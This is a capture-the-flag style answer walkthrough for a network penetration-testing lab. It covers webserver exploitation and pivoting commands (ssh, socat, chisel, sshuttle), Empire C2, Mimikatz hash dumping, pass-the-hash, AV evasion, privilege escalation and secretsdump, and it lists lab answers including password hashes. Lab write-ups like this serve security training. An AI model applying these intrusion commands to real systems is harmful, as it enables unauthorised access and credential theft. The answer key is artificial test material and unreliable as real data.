@@ -1,0 +1,507 @@
+room solution : 
+task 1 introduction : 
+Read the introduction 
+No answer needed
+Task 2  Intro Accessing the Network
+
+Click on the green download button on the access page and save the configuration pack somewhere on your local machine. If this does not work then you may have to click on the "Regenerate" button first, then give it ten seconds before attempting to download the pack.
+No answer needed
+
+Obviously replacing the name of the config with the config that you downloaded. Wreath config packs follow a naming scheme of USERNAME-wreath.ovpn, so an example command might be:
+sudo openvpn MuirlandOracle-wreath.ovpn
+Successful OpenVPN connection sequence
+
+This should give you access to the Wreath network!
+
+No answer needed
+Without closing the connection, open a new terminal (Ctrl + T in most cases). This is the easiest way (technically speaking) to run the OpenVPN client in the background whilst still being able to use the CLI. If you are comfortable using a terminal multiplexer (e.g. Tmux) to create a connection in the background then doing so would be a more elegant solution.
+
+No answer needed
+Controlling the Network:
+
+Finally, the "Network Uptime" field at the bottom right of the network map indicates how long the network has been awake for. This is not necessarily the time since the last reset.
+
+No answer needed
+Task 3  Intro Backstory : 
+
+I'll do it!
+No answer needed
+Task 4  Intro Brief
+
+Let's go!
+No answer needed
+Before we start, if you are using Kali, make sure that it's up to date:
+sudo apt update && sudo apt upgrade
+
+This should not be necessary on the AttackBox.
+
+No answer needed
+Task 5  Webserver EnumerationHow many of the first 15000 ports are open on the target?
+4
+Perform a service scan on these open ports.
+
+What OS does Nmap think is running?
+
+CentOS
+Okay, we know what we're dealing with.
+
+Open the IP in your browser -- what site does the server try to redirect you to?
+
+https://thomaswreath.thm
+You will have noticed that the site failed to resolve. Looks like Thomas forgot to set up the DNS!
+
+Add it to your hosts file manually. This can be accomplished by editing the /etc/hosts file on Linux/MacOS, or C:\Windows\System32\drivers\etc\hosts on Windows, to include the IP address, followed by a tab, then the domain name. Note: this must be done as root/Administrator.
+
+It should look something like this when done, although the IP address and domain name will be different:
+
+10.10.10.10 example.thm
+No answer needed
+Reload the webpage -- it should now resolve, but it will give you a different error related to the TLS certificate. This occurs because the box is not really connected to the internet and so cannot have a signed TLS certificate. In this instance it is safe to click "Advanced" -> "Accept Risk"; however, you should never do this in the real world.
+
+In real life we would perform a "footprinting" phase of the engagement at this point. This essentially involves finding as much public information about the target as possible and noting it down. You never know what could prove useful!
+
+Read through the text on the page. What is Thomas' mobile phone number?
+
++447821548812
+Let's have a look at the highest open port.
+
+Look back at your service scan results: what server version does Nmap detect as running here?
+
+MiniServ 1.890 (Webmin httpd)
+Put your answer to the last question into Google.
+
+It appears that this service is vulnerable to an unauthenticated remote code execution exploit!
+
+What is the CVE number for this exploit?
+
+CVE-2019-15107
+We have everything we need to break into this machine, so let's get going!
+
+No answer needed
+Task 6  Webserver Exploitation
+Run the exploit and obtain a pseudoshell on the target!
+No answer needed
+Which user was the server running as?
+
+root
+Success! We won't need to escalate privileges here, so we can move on to the next step in the exploitation process.
+
+Before we do though: nice though this pseudoshell is, it's not a full reverse shell.
+
+Get a reverse shell from the target. You can either do this manually, or by typing shell into the pseudoshell and following the instructions given.
+
+No answer needed
+Optional: Stabilise the reverse shell. There are several techniques for doing this detailed here.
+
+No answer needed
+Now for a little post-exploitation!
+
+What is the root user's password hash?
+
+$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1
+You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.
+
+What is the full path to this file?
+
+/root/.ssh/id_rsa
+Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command chmod 600 KEY_NAME (substituting in the name of the key) to obtain persistent access to the box.
+
+We have everything we need for now. Let's move on to the next section: Pivoting!
+
+No answer needed
+Task 7  Pivoting What is Pivoting?Read the pivoting introduction
+No answer needed
+Task 8  Pivoting High-level Overview
+Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?
+Tunnelling
+Research: Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?
+
+portfwd
+Task 9  Pivoting EnumerationWhat is the absolute path to the file containing DNS entries on Linux?
+/etc/resolv.conf
+What is the absolute path to the hosts file on Windows?
+
+C:\Windows\System32\drivers\etc\hosts
+How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?
+
+for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
+Task 10  Pivoting Proxychains & Foxyproxy
+
+What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?
+socks4 127.0.0.1 4242
+What command would you use to telnet through a proxy to 172.16.0.100:23?
+
+proxychains telnet 172.16.0.100 23
+You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?
+
+FP
+Task 11  Pivoting SSH Tunnelling / Port Forwarding
+If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?
+L
+Which switch combination can be used to background an SSH port forward or tunnel?
+
+-fN
+It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?
+
+Nay
+What command would you use to create a pair of throwaway SSH keys for a reverse connection?
+
+ssh-keygen
+If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")
+
+ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN
+What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?
+
+ssh -D 8000 user@target.thm -fN
+If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
+
+ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN
+Task 12  Pivoting plink.exeWhat tool can be used to convert OpenSSH keys into PuTTY style keys?
+puttygen
+Task 13  Pivoting Socat
+Which socat option allows you to reuse the same listening port for more than one connection?
+reuseaddr
+If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?
+
+Use TCP port 8000 for the server listener, and do not background the process.
+
+./socat tcp-l:8000 tcp:172.16.0.200:443
+What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
+
+./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &
+Bonus Question (Optional): Try to create an encrypted port forward or relay using the OPENSSL options in socat. Task 7 of the shells room may help with this.
+
+No answer needed
+Task 14  Pivoting Chisel
+What command would you use to start a chisel server for a reverse connection on your attacking machine?
+
+Use port 4242 for the listener and do not background the process.
+
+./chisel server -p 4242 --reverse
+What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
+
+./chisel client 172.16.0.200:4242 R:socks &
+How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
+
+./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &
+If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
+
+./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
+Task 15  Pivoting sshuttle
+How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16
+sshuttle -r pwned@172.16.20.7 172.16.0.0/16
+What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?
+
+--ssh-cmd "ssh  -i priv_key"
+You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.
+
+What switch (and argument) could you use to fix this error?
+
+-x 172.16.0.100
+Task 16  Pivoting ConclusionRead the conclusion and experiment with the pivoting techniques demonstrated.
+No answer needed
+Task 17  Git Server EnumerationExcluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?
+2
+In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)
+
+100,150
+Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?
+
+150
+Let's assume that the other host is inaccessible from our current position in the network.
+
+Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?
+
+80,3389,5985
+We cannot currently perform a service detection scan on the target without first setting up a proxy, so for the time being, let's assume that the services Nmap has identified based on their port number are accurate. (Please feel free to experiment with other scan types through a proxy after completing the pivoting section).
+
+Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
+
+HTTP
+Now that we have an idea about the other hosts on the network, we can start looking at some of the tools and techniques we could use to access them!
+
+No answer needed
+Task 18  Git Server PivotingWhat is the name of the program running the service?
+Gitstack
+Head to the login screen of this application. This can be done by adding the answer to the previous question on at the end of the url, e.g. if using sshuttle:
+http://IP/ANSWER
+
+When navigating to this URI, we are given the following login page:
+Image showing the login screen for the service
+
+Do these default credentials work (Aye/Nay)?
+
+Nay
+Shucks -- it couldn't be that easy, huh? Back to the drawing board then!
+
+Use the command: searchsploit SERVICENAME, on Kali to search for exploits related to this service.
+
+No answer needed
+You will see that there are three publicly available exploits.
+
+There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?
+43777
+Task 19  Git Server Code Review
+Look at the information at the top of the script. On what date was this exploit written?
+18.01.2018
+As this is a Python script, the version of the language used to write the software matters. Many older exploits are still written in Python2. These exploits tend to be incompatible with the Python3 interpreter, and vice versa.
+
+Before we can do anything else, we need to determine whether this exploit was written in Python2 or Python3. A quick way of doing this is to look for the print statements (used to echo output to the console).  If there are no round brackets (e.g. print "Hello World!") then the exploit will be Python2, otherwise the exploit is likely to be Python3 (e.g. print("Hello World!")). Of course, this is far from the only way to check, but it will work for our purposes.
+
+Bearing this in mind, is the script written in Python2 or Python3?
+
+Python2
+Now that we know which version of Python we're dealing with we can execute it in one of two ways:
+
+Using the appropriate interpreter directly (e.g. python3 exploit.py / python2 exploit.py)
+Adding a shebang line in at the top of the exploit. A shebang tells the Unix program loader which interpreter to use to run a script. Shebangs always start with the characters: #!. You then specify the absolute path to the interpreter, so: #!/usr/bin/python3 / #!/usr/bin/python2 / #!/bin/sh, etc. This means that if we execute the script using ./exploit.py, it will be executed by the correct interpreter.
+Add an appropriate shebang to the exploit, at the very top of the file!
+
+No answer needed
+
+
+Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?
+
+csrftoken
+Task 20  Git Server Exploitation
+
+Bonus Question (Optional): Using the given code for the exploit we used against the web server, see if you can adapt this exploit to create a full pseudoshell environment.
+No answer needed
+First up, let's use some basic enumeration to get to grips with the webshell:
+
+What is the hostname for this target?
+git-serv
+What operating system is this target?
+Windows
+What user is the server running as?
+NT AUTHORITY\SYSTEM
+This will send three ICMP ping packets back to you.
+
+How many make it to the waiting listener?
+0
+With that done, set up either a listener or a relay on .200.
+
+No answer needed
+Let's go for a reverse shell!Pick a method (cURL, BurpSuite, or any others) and get a shell!
+
+No answer needed
+Task 21  Git Server Stabilisation & Post ExploitationCreate an account on the target. Assign it to the Administrators and Remote Management Users groups.
+No answer needed
+Authenticate with WinRM -- make sure you can get a stable session on the target.
+
+No answer needed
+Authenticate with RDP, sharing a local copy of Mimikatz, then dump the password hashes for the users in the system.
+
+What is the Administrator password hash?
+37db630168e5f82aafa8461e05c6bbd1
+What is the NTLM password hash for the user "Thomas"?
+
+02d90eda8f6b6b06c32d5f207831101f
+What is Thomas' password?
+
+i<3ruby
+In the real world this would be enough to obtain stable access; however, in our current environment, the new account will be deleted if the network is reset.
+
+For this reason you are encouraged to to use the evil-winrm built-in pass-the-hash technique using the Administrator hash we looted.
+
+To do this we use the -H switch instead of the -p switch we used before.
+
+For example:
+evil-winrm -u Administrator -H ADMIN_HASH -i IP
+
+Pass the hash with Evil-WinRM
+
+No answer needed
+Task 22  Command and Control Introduction
+Read the introduction.
+No answer needed
+Task 23  Command and Control Empire: Installation
+Install and execute Empire/Starkiller
+No answer needed
+Task 24  Command and Control Empire: OverviewRead the overview
+No answer needed
+Can we get an agent back from the git server directly (Aye/Nay)?
+
+Nay
+Task 25  Command and Control Empire: Listeners
+Start a listener in Empire and/or Starkiller
+No answer needed
+Task 26  Command and Control Empire: StagersUsing your choice of Empire CLI or Starkiller, generate a multi/bash stager and save it as a file on your own disk.
+
+No answer needed
+Bonus Question (Optional): Read through the code in the script and see if you can decipher what it is doing. You will need to decode the payload from Base64 before doing so.
+
+No answer needed
+Task 27  Command and Control Empire: Agents
+Using the help command for guidance: in Empire CLI, how would we run the whoami command inside an agent?
+shell whoami
+We have now covered the basics of Empire, with the exception of modules, which we will look at after getting an agent back from the Git Server.
+
+Kill your agents on the webserver then let's look at proxying Empire agents!
+
+No answer needed
+Task 28  Command and Control Empire: Hop Listeners
+Create a http_hop listener in Empire CLI and/or Starkiller.
+No answer needed
+Task 29  Command and Control Git Server
+Both the reverse shell we received way back in task 19, and our evil-winrm access are already running in Powershell, so we would need to adapt the stager generated for us by Empire in order to use them. Instead, it is easier to use it with the webshell we originally used to compromise the machine (i.e. paste the stager as the value of the "a" parameter in cURL or BurpSuite), remembering to URL encode the stager first.
+
+After sending the web request, you should receive an agent in Empire CLI / Starkiller!
+Receiving the agent
+
+Note that the IP here is still .200. This is due to the jumpserver in between our target (the Git server) and our Empire client acting as a proxy in and out of the network.
+
+Bearing this in mind, get an agent back from the Git Server!
+
+No answer needed
+Task 30  Command and Control Empire: Modules
+Read the above information and try to experiment with the Empire Modules available.
+No answer needed
+Task 31  Command and Control Empire: Interactive ShellFind and use the interactive shell in both the Empire CLI Client and in Starkiller.
+No answer needed
+Task 32  Command and Control Conclusion
+Read the C2 Conclusion
+No answer needed
+[Bonus Exercise] Try working through this section again, using a different C2 Framework of your choice. You can use the C2 matrix to help with this.
+
+No answer needed
+Task 33  Personal PC EnumerationScan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?
+80,3389
+Task 34  Personal PC PivotingWhether you choose the recommended option or not, get a pivot up and running!
+
+No answer needed
+Access the website in your web browser (using FoxyProxy if you used the recommended forward proxy, or directly if you used a port forward).
+
+Using the Wappalyzer browser extension (Firefox | Chrome) or an alternative method, identify the server-side Programming language (including the version number) used on the website.
+
+PHP 7.4.11
+Task 35  Personal PC The Wonders of Git
+Use your WinRM access to look around the Git Server. What is the absolute path to the Website.git directory?
+C:\Gitstack\Repositories\Website.git
+Use evil-winrm to download the entire directory.
+
+From the directory above Website.git, use:
+download PATH\TO\Website.git
+
+Be warned -- this will take a while, but should complete after a minute or two!
+
+Note: You may need to specify the local path as well as the absolute path to the Website.git directory!
+
+No answer needed
+Exit out of evil-winrm -- you should see that a new directory called Website.git has been created locally. If you enter into this directory you will see an oddly named subdirectory (the same as the answer to question 1 of this task).
+
+Rename this subdirectory to .git.
+
+No answer needed
+Recreate the repository -- we will perform some code analysis in the next task!
+
+No answer needed
+The short version is: the most up to date version of the site stored in the Git repository is in the NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3 directory.
+No answer needed
+Task 36  Personal PC Website Code AnalysisWhat does Thomas have to phone Mrs Walker about?
+
+Neighbourhood Watch Meetings
+Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?
+
+Basic Auth
+Which extensions are accepted (comma separated, no spaces or quotes)?
+
+jpg,jpeg,png,gif
+We have ourselves a vulnerability!
+
+No answer needed
+Task 37  Personal PC Exploit PoCSee if you can login using these usernames with that password!
+
+No answer needed
+Try uploading a legitimate image -- see if you can access it!
+
+No answer needed
+We have the ability to execute arbitrary PHP code on the system!
+
+No answer needed
+Task 38  AV Evasion IntroductionWhich category of evasion covers uploading a file to the storage on the target before executing it?
+On-Disk Evasion
+What does AMSI stand for?
+
+Anti-Malware Scan Interface
+Which category of evasion does AMSI affect?
+
+In-Memory Evasion
+Task 39  AV Evasion AV Detection Methods
+What other name can be used for Dynamic/Heuristic detection methods?
+Behavioural
+If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?
+
+Static
+When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?
+
+Pre-defined rules
+What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?
+
+Password
+Task 40  AV Evasion PHP Payload Obfuscation
+
+No answer needed
+Awesome! We have a shell.What is the Host Name of the target?
+
+WREATH-PC
+What is our current username (include the domain in this)?
+
+wreath-pc\thomas
+Task 41  AV Evasion Compiling Netcat & Reverse Shell!
+Note: In order for this to work we had to wrap the netcat command inside a powershell process to keep it from exiting early.
+
+No answer needed
+You should get an error message when trying to execute the executable and the exe will also disappear from the current directory (placed into quarantine by the AV). At this point the Administrator has also been alerted, along with the security team in a bigger organisation.
+
+No answer needed
+Task 42  AV Evasion Enumeration
+[Research] One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?
+
+SeImpersonatePrivilege
+Unfortunately this account isn't in the Local Administrators group as that (combined with the High integrity process we're currently using) would make any further privilege escalation redundant.
+
+No answer needed
+What is the Name (second column from the left) of this service?
+
+SystemExplorerHelpService
+s the service running as the local system account (Aye/Nay)?
+
+Aye
+We have full control over this directory! How strange, but hey, Thomas' security oversight will allow us to root this target.
+
+No answer needed
+Bonus Question (optional): Try to get a copy of WinPEAS up to the target (either the obfuscated executable file, or the batch variant) and run it. You will see that there are many more potential vulnerabilities on this target -- mainly due to patches that haven't been installed.
+
+No answer needed
+Task 43  AV Evasion Privilege Escalation
+Write and compile a wrapper program using Mono or Visual Studio.
+No answer needed
+That said, to prevent errors down the line, we should disconnect from it for the time being:
+net use \\ATTACKER_IP\share /del
+Confirmation that the share was deleted successfully. The message should say as much
+
+No answer needed
+
+Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?
+Nay
+For what reason is HTTPS preferred over HTTP during exfiltration?
+
+Encryption
+
+There are a variety of tools that could do this job for us. The most reliable is (as is often the case), a script from the Impacket library: secretsdump.py.
+
+Let's use this against our dumped hives:
+python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL
+
+Demonstration of using Impacket against the dumped hives. Password hashes are obtained.
+
+Each local account on the target is shown here, in a format of Username, RID, LM hash, NT hash -- separated by colons. We are interested in the NT hashes -- the last section (blurred). As a side note: 31d6cfe0d16ae931b73c59d7e0c089c0 is an empty hash, and indicates that the account is not activated. These can thus be discounted.
+
+What is the Administrator NT hash for this target?
+
+a05c3c807ceeb48c47252568da284cd2
+Remove all the tools, shells, payloads, accounts, and any other remnants you left behind.
+
+No answer needed
+Task 45  Conclusion Debrief & Report
